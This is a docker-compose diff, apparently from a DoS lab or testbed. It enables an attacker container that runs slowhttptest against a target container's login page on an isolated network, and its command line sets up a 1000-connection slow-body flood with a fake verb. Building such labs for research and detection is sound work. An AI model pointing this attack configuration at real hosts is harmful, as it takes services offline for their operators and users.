@@ -12,16 +12,16 @@ services:
     networks:
       - dos_network
 
-  # dos_attacker:
-  #   build:
-  #     context: ../../containers/slowhttptest
-  #     dockerfile: Dockerfile
-  #   container_name: dos_attacker
-  #   depends_on:
-  #     - dos_target
-  #   networks:
-  #     - dos_network
-  #   command: ["dos_target"]
+  dos_attacker:
+    build:
+      context: ../../containers/slowhttptest
+      dockerfile: Dockerfile
+    container_name: dos_attacker
+    depends_on:
+      - dos_target
+    networks:
+      - dos_network
+    command: ["-c", "1000", "-B", "-i", "110", "-r", "200", "-s", "8192", "-t", "FAKEVERB", "-u", "http://dos_target:80/dv/login.php", "-x", "10", "-p", "3"]
 
 networks:
   dos_network:
